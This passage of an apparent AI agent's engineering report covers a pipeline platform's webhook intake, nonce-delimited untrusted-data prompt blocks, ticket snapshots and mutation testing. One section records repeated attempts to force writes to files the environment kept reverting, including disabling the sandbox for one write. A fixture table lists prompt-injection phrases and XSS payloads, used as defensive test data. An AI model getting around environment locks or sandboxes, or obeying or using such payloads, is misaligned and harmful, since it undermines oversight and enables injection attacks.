discarded by design rather than by omission. Backlog entry 1's last paragraph asks the WP that flips
a row to assert none of its own is still `unconsumed`; none is flipped here.

**Where the reconciliation worker is composed, and the seam that reproduces the loss.**
`startIntakeReconciliation` (application ring) declares the queue, starts one worker and puts the
first pass on it; `apps/server/src/pipeline.ts` calls it, beside `registerPartitionMaintenance`. The
queue is `stately` with a constant singleton key, so the running pass may enqueue the next one (an
`exclusive` queue would drop its own re-enqueue and the chain would die after one tick) and every
replica's boot enqueue collapses onto the one pending job. `PipelineComposition.jobs` is the
labelled seam the recovery e2e uses; no production path passes it.

**Assumptions recorded.** (1) `bindings.config` is honoured for **normalisation** and not for
verification, per decision 2 above; nothing in this build writes a non-empty `bindings.config`, so
the difference is unobservable today and the test that pins it is
`inbound-loader.test.ts` › *"builds the account one from `integrations.config` and each binding from
its own merge"*. (2) A delivery whose body is not a **JSON object** is refused (400): it cannot be
stored in a `jsonb` column and no shipped normaliser can read one. (3) Inbound normalised events are
appended on the **project** stream (`stream_type: 'project'`), not the integration's — the pipeline's
ordering is per project, and putting them on the integration would serialise two projects that share
one Jira site behind each other.

#### FOR THE REFINER — two files became unwritable mid-session, and the workarounds are in the tree

**Measured, not inferred.** `packages/application/src/pipeline/runtime.ts` and
`apps/server/src/config.ts` accepted a write and were restored to `HEAD` within ~3 seconds, every
time, through **four** different mechanisms: the Edit tool (which reported success), `python3`
in-place, `printf >>`, and an atomic `mv` over the path. Instrumented:
`printf '\n// probe2\n' >> runtime.ts` → `6689` bytes, `sleep 3` → `6678` bytes, content identical to
`HEAD`. The restored files came back with mode **`600`** where their neighbours are `644`
(`config.ts` also came back group `wheel`), and `chmod 644` did not stick either. Disabling the
sandbox for one write made no difference. Every other file in the repository — including files the
Edit tool had touched — stayed writable for the whole session, so this is **not** standing rule 77's
"any Edit-touched file"; it is a narrower and worse failure: **two specific paths became read-only
and stayed that way.** It also produced two transient test failures that are not product defects
(`tsc` reporting `integrations.ts` "has no exported member" on a file whose exports are present, and
one e2e run failing with `loadServerConfig is not a function`), both of which vanished on a re-run —
so a future session that meets one of those should suspect the tree before the code (rule 74's
shape, with the orchestrator's own tooling replaced by the environment).

**`config.ts` became writable again near the end of the session; `runtime.ts` never did.** That is
worth stating precisely, because it is the difference between "this environment has a rule" and
"this environment has a fault": the lock is **not** permanent and **not** a property of having used
the Edit tool. What it left behind:

- **Fixed once the file unlocked.** `POOL_RESERVATIONS.pipeline` is `4`, `requiredPoolConnections`
  answers **12** at the shipped defaults (asserted by `apps/server/src/config.test.ts` ›
  *"refuses a pool that only satisfies the dispatcher’s own floor"*), `UndersizedPoolError`'s message says four workers,
  `.env.example` ships `APP_DB_POOL_MAX=14` with the arithmetic spelled out, and
  `APP_INTAKE_RECONCILE_INTERVAL_MS` is an ordinary field of `ServerConfig` with its own tests. The
  temporary `apps/server/src/intake-reconcile-config.ts` written while the file was locked is
  **deleted**.
- **Closed by the orchestrator during review round 1.** `packages/application/src/pipeline/runtime.ts`
  stayed locked for the implementer and was fixed with the Edit tool afterwards — its
  pool-arithmetic docblock now carries the `+ 1` for the fourth worker and says where it is composed.
  Round 1 also corrected the two remaining stale sums (`config.ts`'s `2N + 9` and `.env.example`'s
  "three job workers"): the shape at `pipeline: 4` is **`2N + 10`** — 12 at N=1, **18** at N=4 where
  WP-15b's `3N + 8` would have been 20.
  **Three sites were repaired and two more were not**, found by the refiner after the merge:
  `apps/server/src/config.test.ts:134` still says *"the pipeline's three job workers"* (its assertion
  is symbolic and correct, so the test passes while its own sentence is wrong), and
  `packages/infrastructure/src/db/config.ts:85-93` still says the floor is **11** and that its
  `poolMax: 13` keeps *"two connections of slack"* — at a floor of 12 it keeps one, and
  `.env.example` ships **14**, a divergence **no test reads**. The class, the **seven** sites and
  what "derived" can honestly mean in each medium are **backlog 22**.
- **What stays a decision rather than a defect**: `pipeline.intake.reconcile` is composed by
  `apps/server/src/pipeline.ts` (beside `registerPartitionMaintenance`) rather than by
  `createPipelineRuntime`. It was chosen under the lock and it is defensible where it is — a
  maintenance schedule the process owns is exactly what `registerPartitionMaintenance` is — but it
  should be re-decided deliberately rather than inherited.
- **The mechanism, measured by the orchestrator and worth carrying**: the environment reverts an
  **out-of-band** write (shell, `python3`, `sed`) to a file the **Edit tool** has touched, and reset
  one file's mode `644` → `600`; the **Edit tool's own writes persist**. That is standing rule 77
  with the surviving path named, which the rule did not have before.

**Review round 1's five corrections, and the one that changed the program.** Four were false or
stale sentences (rules 44/63): `refuse()`'s claim that every refusal detail is this module's own
constant, two stale pool sums, a citation naming a file that never existed, and a missing
`on conflict` on 0014's registry insert. The substantive one is the first: two branches carry
foreign text — `unkeyable` forwards the adapter's `IntegrationError.message` (GitLab and Slack
interpolate `object_kind`/`type` into theirs) and `provider_mismatch` interpolated an **unbounded**
URL segment. No leak was demonstrated, and the fix is not an argument that none exists: the detail
is now **redacted and counted** like every other stored string
(`packages/application/src/integrations/inbound.test.ts` › *"redacts the adapter’s own refusal
message, which is provider text and not this module’s"*), and `webhookParamsSchema.provider` is bounded to the registry's own slug shape, so
a segment that cannot name any provider is a 400 at the boundary while a slug-shaped mismatch still
reaches the handler and is audited. The fifth was a wall-clock `setTimeout` in front of an
*absence* assertion; it now waits on **two completed reconciliation passes**, counted through the
same jobs seam, because a starved machine satisfies a sleep without running anything.

#### Discovered work (WP-15c)

- **No rate limit on the webhook endpoint** — technical/08 asks for one per integration. Filed as
  **Q60** with a recommendation and the amplification bound measured rather than assumed (one
  `integration_actions` insert per refused request; no event, no inbox row).
- **`inbox_unprocessed_idx` selects nothing in this build.** `processed_at` is written at insert
  because normalisation happens in the request. The index becomes live the day normalisation moves to
  a sweep, which is the shape technical/06's amendment names.
- **The ingress does not re-redact a normalised event payload.** It redacts what it stores itself and
  trusts the adapter for what it was handed;
  `packages/integrations/src/providers/inbound-redaction.test.ts` holds every provider directory to
  that, and the gap that remains is a *neighbouring* binding's credential, which only TD-012 step 2's
  pattern rules would see — and the loader composes those, but the adapter does not.
- **The polling fallback technical/06 specifies is still unbuilt**, and nothing in this work package
  claims otherwise. The reconciliation recovers a *lost intake wake-up*; it does **not** poll a
  provider, so a ticket that matches while the platform is down and is never re-delivered is still
  never seen. That is the polling fallback's job and it belongs to whoever builds it.
- **`apps/server/src/app.test.ts` drives `buildApp` with `webhooks: null`**, so the route is absent
  there. A test tier that could compose an ingress without a database would be able to assert the
  route's raw-body parser directly; today only the e2e can.

### WP-17 — the delimiter first, then the pack; and the eval half that cannot run

**Order, because it was the one non-negotiable.** Backlog 12 asked that the `contextPack` wiring of
backlog 11 not ship before the delimiter, *"or the window opens for the length of a work package"*.
It did not: `packages/domain/src/prompt/data-block.ts` and `assembly.ts` are the first two files of
this change, and `createStageRunPlanner` passes a non-empty pack only through `assemblePrompt`. There
is no commit in this work package in which a pack reaches a prompt undelimited.

#### The contract

A block is `<untrusted-data-<nonce> kind="…" …>` … `</untrusted-data-<nonce>>` with **32 hex
characters drawn at random per prompt**. Three properties, each with a named test:

1. **The body is byte-identical.** Nothing is stripped, escaped or re-encoded — so there is nothing
   for a later transform to undo, which is `apps/web/src/ui/untrusted.tsx`'s answer to the same
   question. The difference a prompt forces is that there is no React text node, so the contract is a
   delimiter **plus a rule about the marker**.
2. **Nothing untrusted reaches a marker.** The tag is a constant, the nonce is `[0-9a-f]{32}`, and an
   attribute value outside `A–Z a–z 0–9 . _ - /` is **refused**, never escaped or truncated. A vault
   name derived from a vault path — `path` **and**, since round 1's first finding, its sibling
   `file` — is an attribute only when it matches that alphabet and is short enough; otherwise the
   marker carries `<name>_omitted="too_long"` or `"unsafe_characters"`, the two degrade
   independently, and a document that loses both cannot be cited at all (the header says so).
   Refusing the whole run for a badly named file would be a vault page's veto over a task.
3. **A truncation the platform applies is announced in the marker** (`truncated="true"`,
   `original_chars="…"`), never as a line inside the body — technical/07's forgeable-marker
   paragraph, closed at the place it says it closes.

**Why a nonce and not the `<ticket>` of technical/04 step 5.** A fixed tag is closed by any body that
contains it. The two ways out are escaping the body — which breaks property 1 and leaves an encoder
whose correctness nobody can see — or making the close marker unguessable. The doc is amended
(technical/04 § "Prompt assembly") rather than contradicted.

**The residual, stated at the line and not implied.** This is a guarantee about the **structural
parse**, which is the only thing a string can guarantee. A model that ignores the stated rule and
treats a visually convincing `</untrusted-data-0000…>` as a terminator is not protected by any
delimiter scheme, escaping included; what the nonce buys is that the correct reading is always
*derivable from the prompt*. Measuring the model's compliance is exactly what the eval cases exist
for, and that is the half no credential in this repository can run.

#### The hostile document, per construct, measured rather than assumed

The brief said all six flow byte-identical to the prompt. **Two do not, and that is correct.**
`sanitiseDocumentText` replaces C0/C1 controls, DEL and the bidi overrides with `U+FFFD` and counts
them (measured on this build: `removed = 1` for ESC, BEL, `U+202E`, `U+2066`).

| Construct | What the assembled prompt contains |
|---|---|
| `Ignore all previous instructions…` | verbatim, inside a `knowledge_document` block |
| `<system>…</system>` | verbatim, inside the block |
| `<img src=x onerror=…>` | verbatim, inside the block |
| `javascript:window.__pwned=true` | verbatim, inside the block |
| ANSI `ESC[31m` | **`U+FFFD`[31m** — the escape replaced at parse, the word intact |
| `U+202E` | **`U+FFFD`** — replaced at parse |

`packages/application/src/pipeline/planner.test.ts` asserts each of the six against
`spec.userPrompt` after the real parser, the real retrieval and the real assembler, and asserts the
platform's voice contains none of them.

**The four zero-width characters** (`U+200B`, `U+FEFF`, `U+2060`, `U+00AD`): measured here for the
first time. All four pass the sanitiser untouched (`removed = 0`), reach the block body
byte-identical, and **buy nothing on either side of the contract** — a spoofed marker still has to
carry a nonce the author cannot predict, and a zero-width character *inside* a nonce makes it fail
`NONCE_PATTERN` for the reader exactly as it fails it for the writer. Both directions are asserted
(`data-block.test.ts` › *"does not let a zero-width character inside a marker close the block"* and
*"does not let the nonce spliced with a zero-width character close the block"*). **The second place
backlog 12 names is confirmed open**: `extractQueryTerms('sess<U+200B>ions rollback')` returns
`["sess","ions","rollback"]`, so a term split by an invisible character is unmatchable. It is an
indexing-side question, it is not WP-17's, and it is in the discovered work below.

#### Mutation checks (rule 77's recipe: a copy, calibrated first)

`cp` into `packages/domain/src/prompt/zzmutant/`, mutate the copy, run a copy of the tests, delete
both. Calibration: unmutated **62/62 passed, exit 0**; a planted `DATA_BLOCK_TAG` typo reported
**1 failed, exit 1**. Every guard died:

| Mutation | Result | Killed by |
|---|---|---|
| attribute-value guard → `return` | 12 failed | *refuses `<name>` as an attribute value rather than escaping it* (×10) |
| nonce-shape guard → `return` | 5 failed | *refuses a nonce that is too short / upper case / not hex / …* |
| `body.includes(nonce)` deleted | 1 failed | *refuses a body that already contains the nonce* |
| `nonceIsUsable` collision check deleted | 3 failed | …and *recovers when a later nonce is usable* |
| `assertPlatformVoice` → no-op | 1 failed | *refuses a stage id, a role name or a role version outside the platform alphabet* |
| unsafe vault path always in the marker | 1 failed | *drops a vault path that is not in the platform alphabet* |
| marker loses the nonce (fixed tag) | 23 failed | the whole spoof and round-trip set |
| truncation attribute dropped | 1 failed | *announces its own truncation in the marker* |
| `kbSearch` turned into a refusal (`apps/server/src/platform-tools.test.ts`, same recipe) | 1 failed | *does not refuse kb_search — it reaches the store, which is what fails here* |

#### The neighbours

- **Backlog 13 — done.** `contextBudgetTokensSchema = tokenCountSchema.max(200_000)` in
  `packages/contracts/src/config.ts`, at the boundary rather than at the assembler. 200 000 is the
  smallest context window in the current Claude line-up (Haiku 4.5; the others are 1 M —
  <https://platform.claude.com/docs/en/models/overview>, retrieved 2026-09-12), so it refuses the
  configurations that are *impossible* rather than the ones that are merely expensive.
  `tokenCountSchema` itself stays unbounded: it also types `runs.input_tokens`, which is a **report**
  and not a request (rule 20).
- **Backlog 14 — the unit was wrong, and that is now fixed; the ratio is not, and that is now
  stated.** `estimateTokens` is `ceil(utf8ByteLength(t) / 4)` where it was `ceil(t.length / 4)`.
  A byte-level BPE splits the UTF-8 encoding, so a three-byte script was being counted at a third of
  its weight: the measured corner, 48 000 CJK characters, moves from **12 000** (exactly the shipped
  default budget) to **36 000**, and every ASCII figure in the repository is unchanged. The **ratio**
  is still a hypothesis and is now labelled one at the line: Anthropic's own documentation gives
  *"1M tokens is roughly … 2.5M Unicode characters on the current tokenizer"*, i.e. ~2.5 characters
  per token for mixed prose against this estimator's 4 bytes — so it can still under-estimate, and
  closing that needs a real tokeniser rather than another constant. The property backlog 14 asked
  for exists: `tokens.test.ts` › *"is exactly the stated ratio over UTF-8 bytes"* fails for any
  divisor but the shipped one and for any unit but bytes, which the two previous properties did not.
- **Backlog 15 / Q58 — not taken, and the trigger it named has now arrived.** A junk query still
  fills the budget; nothing here rejects one. The line is noted where it now costs something
  in `planner.ts`, at `taskTextOf`. It was not calibrated on the fixture vault, because backlog 16 says
  that vault cannot falsify a precision fix.

#### Decisions and assumptions

- **`StageRunPlanner.plan` returns `{ spec, contextPack }`.** The audit record carries scores, token
  counts and the `validated` flag of documents that did **not** make it; a record derived from the
  spec could not carry the second.
- **The executor is now transaction / plan / transaction.** Assembling a pack is four to six queries;
  doing it inside transaction 1 would hold one pooled connection while borrowing a second, which is
  backlog 19's shape at the site that could afford it least. The plan happens **between** two
  transactions, so the connection it borrows *replaces* the worker's — the same argument
  `POOL_RESERVATIONS.pipeline` already makes, and **no change to the pool arithmetic**. The cost is
  that the four re-validation questions are asked twice (`revalidate`, one function, two callers):
  a task can be paused, returned or superseded while its pack is being assembled, and finding that
  out is a *success* exactly as it is in transaction 1a.
- **`nonce`, `prompts` and `contextPacks` are required planner options, never defaulted** (rule 31).
  A default nonce would make the marker predictable, which is the one property the contract rests on.
- **Layer 3 is not concatenated into the system prompt.** `.agentic/rules/*.md` arrive as tier-0 pack
  documents with `kind="project_rules"`; BD-025 makes them configuration the platform trusts to come
  from the default branch, not platform voice. Amended in technical/04.
- **`packages/prompts` ships markdown read from disk at import**, because promptfoo takes a prompt
  file and product/13's project override is "replace `prompts/<stage>.md`". Read **eagerly**, so a
  missing prompt is a boot failure of the process rather than a failure of the first run that needs
  that role.
- **No per-role `schema.json` (a deviation from TD-016).** `schemas/artifacts/*.schema.json` is
  already generated from the one zod definition and checked by `schemas:check`; a second copy per
  role is a second corpus to drift (rule 41). A case names its `artifact_type`.
- **`cases.json`, not `cases.yaml` (the second deviation from TD-016).** promptfoo accepts JSON, and
  this repository has no YAML parser; adding one so a test can validate a file nothing can execute is
  cost with no benefit.
- **The production `PlatformToolPort` implements one tool and refuses eight, by name.**
  `apps/server/src/platform-tools.ts`: `kb_search` is real; `ask_human`, `notify_human`,
  `report_progress`, `get_task_context` and the four mutating ones throw
  `PlatformToolUnavailableError` naming what is missing — the `unavailableClaudeRunner` precedent
  beside it, and for the same reason (a null object returning `{}` is a tool the model believes it
  used).
- **`PipelineComposition.runner` is now a factory over the tools**, `(tools) => ClaudeRunner`. It is
  the only way the port reaches a run, and passing a ready-made runner would have left the tools with
  no consumer — which is the shape backlog 11 is about.

#### The eval blocker — exactly what a human must provide

`pnpm eval` exists and **exits 1**, naming both gaps; `scripts/eval.test.ts` holds it to that,
including the rule-18 half (an *empty* `ANTHROPIC_API_KEY` is reported missing, a non-empty one is
not). Nothing is stubbed and no target went green on it.

1. **Add the dependency:** `pnpm add -Dw promptfoo`. TD-016 names it; it is not in the tree.
2. **Provide a model credential**, one of:
   - **locally**: `ANTHROPIC_API_KEY` (or `CLAUDE_CODE_OAUTH_TOKEN`) in the shell that runs
     `pnpm eval`;
   - **in CI**: a repository **environment** named `llm-ci` (13-implementation-plan.md names it for
     WP-33) carrying an `ANTHROPIC_API_KEY` secret, referenced by the `prompts/**` PR job of TD-016.
     `gh secret list` is empty today and the repository has **no environments at all**.
3. **Then runnable:** `pnpm eval` (all ten roles) or `pnpm eval --roles=reviewer`. It builds
   promptfoo's input into a temp directory from the checked-in `cases.json`, `prompt.md` and
   `PLATFORM_PROMPT`, so layer 1 has exactly one copy in the repository.
4. **Budget:** TD-016's `EVAL_MAX_USD` is not wired, because nothing can spend yet. Whoever supplies
   the credential should wire it in the same change; 36 cases × 10 roles at Haiku-graded rubrics is
   the order of a few dollars per full run, **unmeasured**.

What is *not* blocked and is checked in: the 36 cases, their assertions, the promptfoo base config,
and `packages/prompts/src/evals.test.ts`, which fails when a case reads a field the artifact schema
does not have. That test measures **drift between a case and a schema**, and nothing about whether a
model would satisfy the case (rule 3: it is labelled with what it measures).

#### What this work package did **not** do, and why

**The ten platform skills of product/13 are not shipped.** They are on WP-17's plan row and I
declined them, for the reason WP-16 declined wiring `KnowledgeIndexer`: *nothing can mount them.*
`RunSpec.skills` is a **filter** over skills the CLI discovers from the workspace's
`.claude/skills` (verified in the installed SDK: `skills?: string[] | 'all'`, "Names match the
SKILL.md `name` / directory name"), and technical/04's decision is to copy the platform's skills
into `.claude/skills/_platform/` **at provisioning**. The pipeline composes no `WorkspaceProvider`
and no `ClaudeRunner` (Q52), so ten markdown files would be data nothing reads — which is the exact
shape of backlog 11, the defect this work package exists to close. Shipping them belongs with the
provisioning step that mounts them. `loki/provider.ts`'s `skill: null` note is updated to say so
rather than to point at this work package.

#### Discovered work (WP-17)

- **The platform stores no ticket title or body, so retrieval has almost nothing to query with.**
  `tasks` has `ticket_provider/key/url` and nothing else (migration 0004), and `ticket.matched`
  carries no title either. technical/07 step 2 says the query is built from "task text (ticket +
  spec)"; at the **first** agent stage there is no spec, so the query is the ticket key — one term.
  `taskTextOf` uses the key plus every prior artifact's JSON, which is the best available, and the
  pack at `refinement` is therefore tier-0 plus whatever one keyword finds. This is bigger than
  WP-17 and is written up under **FOR THE REFINER** in the implementer's report.
- **A zero-width character splits a term in `extractQueryTerms`** (measured: `sess<U+200B>ions` →
  `["sess","ions"]`), so a vault page carrying one has a term no query can match. Backlog 12's second
  place, confirmed; it is an indexer/query question, not a delimiter one.
- **`repoPaths` has no production source.** There is no checkout at plan time, so
  `StageRunPlannerOptions.headPaths` is absent in `apps/server` and a knowledge document carrying a
  `paths:` glob is recorded `validated: false` and never admitted. It is logged once per run rather
  than defaulted silently; WP-18 supplies it when it wires the indexer to a checkout.
- **Nothing writes the pack's files into `.agentic-run/context/`.** `RunSpec.contextPack` names paths
  the workspace provisioner would create, and the pipeline does not compose `WorkspaceProvider` (Q52's
  neighbourhood). Both tiers are therefore **inlined in full** in the prompt, which is what the budget
  already accounts for (`assembleContextPack` charges tier 1 its whole token count). When provisioning
  lands, tier 1 can become a path reference plus a summary.
- **Two vault paths can fold onto one workspace name.** `workspaceNameFor` collapses every run of
  non-alphanumerics to `_`, so `a/b.md` and `a-b.md` collide. Pre-existing (WP-16); it matters more
  now that the name is what a model cites by.
- **`packages/prompts` reads `prompt.md` relative to `import.meta.url`.** A `tsc` emit that copies
  only `.js` would ship a package with no prompts — a packaging obligation for **WP-22**.
- **The eight refusing platform tools.** Each needs a collaborator this build lacks; they are named
  individually in `apps/server/src/platform-tools.ts` so the next work package can take them one at a
  time rather than "implement the tools".

#### WP-17 — review round 1 (REQUEST_CHANGES): three fixes

**1. A long vault path vetoed every run on the project.** `path` degraded and its sibling `file` did
not, which made the module's own stated principle — *"refusing the whole run for a badly named file
would be a vault page's veto over a task"* — true of one attribute and false of the other.
`workspaceNameFor` folds a path's *characters* into the marker alphabet but not its *length*, and
nothing upstream bounds a vault path. Re-measured through the real `workspaceNameFor` and the real
`assemblePrompt`: a **463**-character vault path folds to **486** and renders; `.agentic/knowledge/`
plus a 255-character directory and a 255-character filename is **533** — a path any filesystem
permits — folds to **556**, and **threw** `UnsafeMarkerValueError` on `file`. That throw fails
`plan()`, fails the run and escalates the task to `needs_human`, so one deeply nested KB page stopped
the pipeline for the whole project.

The fix is `markerValueRefusal` in `data-block.ts` plus `derivedNameAttribute` in `assembly.ts`: the
two attributes **derived from a vault path** degrade to `<name>_omitted="too_long"` or
`"unsafe_characters"`, independently of each other, and the block stays closed with its text intact.
**The guard is not weakened** — `assertSafeValue` still throws; the assembler stops handing it a
value it already knows will be refused, and `assertPlatformVoice` still throws for the role, the
version and the stage id, which are the platform's own values. Rule 68's audit over the *set* of
attributes is now a table in `documentBlock`'s docblock: `tier`/`tokens`/`version`/`original_chars`
are platform integers, `reason`/`artifact_type`/`truncated`/`kind` are platform vocabulary and
**throw**, `file` and `path` are the only two derived from untrusted input and both degrade, and the
`ticket` block carries no attributes at all. **No third asymmetry.** Mutations (copy, calibrated
66/66): `file` back to raw → *drops an over-long file instead of failing the run* dies; the whole
degradation off → three named tests die.

**2. The stated cause of the moved pinned figures was wrong.** The comment blamed the `U+FFFD` of
the hostile document. Reproduced from the shipped defaults through the real assembler: **the hostile
document is not in the pack at all and the pack contains no `U+FFFD`.** The whole pack delta is **em
dashes** — `index.md` carries six `U+2014` (+12 bytes, +3 tokens) and `D-0001-postgres-sessions.md`
one (+2 bytes, +1 token) — which is both `10 552 → 10 556` and `438 → 442`. Only the **vault** total
involves the hostile page: `19 100 → 19 108` is +4 em dashes and +4 from its eight `U+FFFD`, and it
is now **19 124** because fix 3 planted a line in that document. Corrected at all three sites. Rule
39, and the concrete cost of leaving it: a future reviewer told the cause is the hostile document
would mis-diagnose a genuine move.

**3. A vacuous assertion.** *"carries the zero-width characters through untouched"* asserted only
that the platform voice contained no `U+200B` — and the fixture vault contained none either, so it
would have passed an implementation that stripped them (rule 3 meeting rule 45: the property was in
the test's name and nowhere in the corpus). `FIXTURE_ZERO_WIDTH` is now a line of
`hostile-document.md`, and the test asserts both halves: all four characters arrive in a block
byte-identical, and none reaches the platform's voice. **Proved non-vacuous by mutation**: widening
`sanitise.ts`'s `UNSAFE` class to include the four made it fail (`1 failed | 11 passed`), and the
mutation was reverted. That one had to be **in place** rather than on a copy — the assertion spans
the domain parser and the application planner, which a copied module cannot reach — so it was done
with the Edit tool, immediately reverted, and `git diff HEAD` was checked to confirm the only
remaining change to that file is a docblock line.

### WP-15f — the ticket's own words, and the fourth duty that could not hold the criterion

**The shape.** The platform reads the ticket **once per task** through `TaskManagementPort.readTicket`,
bounds and redacts the answer, and stores it as `tasks.ticket_snapshot` + `ticket_snapshot_at`
(migration **0015**). `packages/application/src/pipeline/ticket-snapshot.ts` is the whole of it —
`boundTicketSnapshot` (pure), `readTicketSnapshot` (the call), `ensureTicketSnapshot` (the backfill).
`ticketBlock` (`packages/domain/src/prompt/assembly.ts`) renders it inside the `kind="ticket"` data block
and `taskTextOf` (`planner.ts`) puts the title and description at the **front** of the retrieval query.

**Two call sites, not a fourth `pipeline.outbound` duty — and the reason is an ordering read off the
code, not a preference.** Q61 (3) and the plan row both propose a fourth duty beside
`intake_check`/`workpad`/`status`. Measured against the row's own acceptance criterion — *"the assembled
prompt at the **first** agent stage contains the ticket's title and description"* — a fourth duty
**cannot hold it**: `runIntakeCheck` creates the task and calls `enqueueStage` on the line after the
commit, while a duty woken by a handler of `task.created` can only start after the outbox *sweeps* that
event, and would then have to resolve the project's bindings (a `bindings` read, a `secrets` read, an
envelope decryption) and complete a provider round trip before the stage worker reaches `planner.plan`.
Nothing orders those. So the fetch happens at the two points that **are** ordered with respect to the
prompt, and the property the clause exists to buy is kept by both — outside every transaction, through
`IntegrationActionExecutor`, refused mechanically by `assertOutsideTransaction` if that changes:

1. **`intake_check`**, which *is* a `pipeline.outbound` duty, in its call phase beside the
   branch-protection read. The snapshot goes into the `insert` that creates the task.
2. **The `stage.execute` job**, before an agent stage, when the task has no snapshot — the self-healing
   half, and the implementable part of Q61 (b).

**The lost-update trap is avoided rather than survived** (backlog 18, standing rule 79). Intake writes at
`insert`, where no other writer exists yet; the backfill uses the narrow `tasks.saveTicketSnapshot` (two
columns), whose **signature** makes it incapable of writing anything else. There is **no new `tasks.save`
call site**, and `save`'s own column list does not include `ticket_snapshot`, so the twenty existing sites
cannot clobber it either. The contract case asserts a **derived total**: a concurrent `save` writing
`cost_actual` 4.25, then a snapshot write, then `cost_actual` is still 4.25 and the state and stage are
still the ones the other writer set.

**The byte budget, derived rather than proposed.** Q61 offered 1 KiB / 64 KiB / 20 × 4 KiB and said the
numbers were a proposal. These come from three figures already in the repository —
`DEFAULT_CONTEXT_BUDGET_TOKENS` 12 000, `BYTES_PER_TOKEN` 4 (and the ~2.5 characters/token vendor datum
its docblock cites), and `MAX_ARTIFACT_CHARS` 20 000, the cap the same prompt already applies to one
prior artifact — under one rule: **the ticket is one document in the task block, so it is bounded like
one.** Title **512** characters, description **20 000** (= `MAX_ARTIFACT_CHARS`), the newest **20**
comments at **1 000** each plus **128** for the provider's comment id and **128** for the author's
display name. Characters, not bytes, because the two neighbouring caps are in characters and a byte cut
can split a surrogate pair. Worst case, **produced by a test rather than quoted** (rule 39):
`TICKET_SNAPSHOT_MAX_TEXT_CHARS` = **45 632** characters, ≤ **182 528** bytes of UTF-8 — a **292×**
reduction on Q54's measured 53 284 565 — and **11 408** estimated tokens for ASCII, which is **additive
to** the 12 000-token pack budget rather than inside it (the ticket block and the knowledge documents are
separate regions of one user prompt), so the claim is that the ticket can equal the knowledge base and
never dwarf it. Every cap is a cut with a marker, never a refusal.

**The three sub-decisions, as settled.** **(a) Comments in**, the newest 20, oldest-first for reading and
newest-first for selection; the platform's own workpad comment is skipped (`marker_id` is non-null
exactly when the platform wrote it), because feeding an agent the stage checklist the platform rendered
about this task is noise. **(b) Freshness: the settled answer is not implementable in this build, and the
implementable half ships.** Q61 (b) asks for a re-read *"when the snapshot predates the task's last
provider signal"* — **that quantity does not exist here**: the only provider signals about a ticket are
`ticket.comment.added` and `ticket.status.changed`, both declared `unconsumed`
(`events/consumption.ts:89-90`), both carrying a **nullish** `task_id`, and both appended to the
*project* stream (`integrations/inbound.ts:180`), so nothing on a task row or in a task-scoped query can
answer it. Producing it means a new consumer for those two types — WP-24's and WP-31's work, and exactly
the change-by-implication Q61 (b) refuses for `ticket.updated` — or an unbounded project-stream scan with
no port for it. So the re-read at stage start fires when the snapshot is **absent**, and the residual is
stated at the line and here: **a description a human edits after intake is invisible to the platform**,
and closing it needs the `ticket.updated` normalisation that question rules out. **(c) Retention:** the
snapshot dies with the task by the row it sits on, is readable by anyone who can read the task, there is
**no config knob**, and technical/03's `tasks` line now names it as untrusted stored external text beside
the sentence `inbox` already has.

**Redaction — both steps of TD-012, after review round 1 corrected the filing that said otherwise.**
Through the redactor on `TaskManagementBinding`, filled by `bindings/loader.ts` with the exact instance
the adapter was built with: step 1 (this binding's credentials plus the call's run-scoped ones, Q55)
**composed with step 2**, the gitleaks-derived patterns, which `createPipelineIntegrationsLoader` now
takes as `platformRedactor` exactly as `createInboundIntegrationLoader` has since WP-15c, and which
`apps/server/src/pipeline.ts` passes on the line beside the one it already passed for `inbox`. Round 1's
first draft filed this as discovered work on a **false comparison** — it claimed step 2 reached neither
sink, when `inbox` has had it all along, so *one provider call* had two sinks treated oppositely: a
`glpat-…` pasted into a ticket body was pattern-redacted in `integration_actions` (the executor holds its
own `patternRedactor`, and it redacts the audit row rather than the result it returns) and stored
**verbatim** in `tasks.ticket_snapshot`, then rendered into every prompt — and into whatever task DTO
first carries the field, which none does today.
Redact **then** cut — an exact-match redactor cannot find a secret a cap has halved, which is
`inbound.ts`'s argument — so `redaction_count` is over the text as **read** rather than as stored, and a
cut can only ever land inside a placeholder.

**Assumptions.** The snapshot stores title, description and comments and **not** `labels`, `status`,
`epic`, `siblings` or `attachments_text`, although `readTicket` returns them: Q61 names the first three
and every extra field is another thing to bound. The snapshot is **not** exposed in an API DTO — Q61 (c)
says it is readable by anyone who can read the task, which is a statement about access control rather
than a requirement to add a field here, and the board's own missing title is Q48.

**Mutation checks** (copy recipe, rule 77; canary first — `MAX_TICKET_TITLE_CHARS` 512 → 511 was reported
as a named kill before any real mutant was believed). Each landed (verified by re-reading the file) and
each died by name: the `ensureTicketSnapshot` already-read guard → *"reads the ticket once per task,
however many stages run"*; cut-before-redact → *"finds a credential past the description cap, because it
redacts before it cuts"*; `readTicketSnapshot`'s fail-open catch → two saga cases; `ticketBlock` back to
identity-only → **8** cases across three files; an unread ticket marked `text="read"` → two; a
`saveTicketSnapshot` that writes a column it was not given → the contract case; `taskTextOf` back to the
ticket key alone → two; intake not writing the snapshot at `insert` → two; the stage-start backfill
removed → one. The two fetch sites are told apart by the **audit row**, not by the final state: the
intake read carries `taskId: null` because the task does not exist yet, the backfill's carries the id.

### WP-15f — review round 1: the `catch` that disarmed WP-15d's guard, and a filing built on a false comparison

Both of the round's **majors** were mine to own, and both were invisible to every tier.

**1. One `catch` doing two jobs.** `readTicketSnapshot` swallowed `TransactionOpenError` along with
every provider failure, on **both** call sites — intake's `read()` is inside the same `try`. The
reviewer probed it: `withOpenTransaction(() => readTicketSnapshot(…))` answered
`{"threw": false, "value": null}`. So WP-15d's guard was **disarmed exactly where this work package
added two new provider calls**, my own docblock and the ledger both claimed it was "refused
mechanically", and a later move of either call inside a transaction would have held a pooled
connection across a provider round trip *and* silently dropped the ticket text. `open-transaction.ts`
is explicit that there is "no retry, no fallback and no configuration that makes it right", so the
refusal is now rethrown and the provider-failure fallback beside it is unchanged. Two named tests hold
it — the door (`integrationsForProject`) and the call (`read`) are separate refusals and each is
asserted from both sides (rule 42) — and re-disarming the rethrow kills both.

**2. The step-2 filing rested on a false comparison, and the gap was live.** The first draft filed
"TD-012 step 2 reaches neither sink" as discovered work. `inbox` **does** get step 2
(`apps/server/src/pipeline.ts`'s `composeWebhookIngress`, since WP-15c), so the true statement is far
worse: *one* provider call had two sinks treated oppositely. Fixed rather than filed, and it was as
cheap as the sibling suggested — `platformRedactor?: SecretRedactor` on
`PipelineIntegrationsLoaderOptions`, composed after the binding's own, and one line in the composition
root. Held at three levels: the loader composition (both directions — the platform rule fires, and the
binding's still does), and the **production** composition through the ingress e2e, which plants an
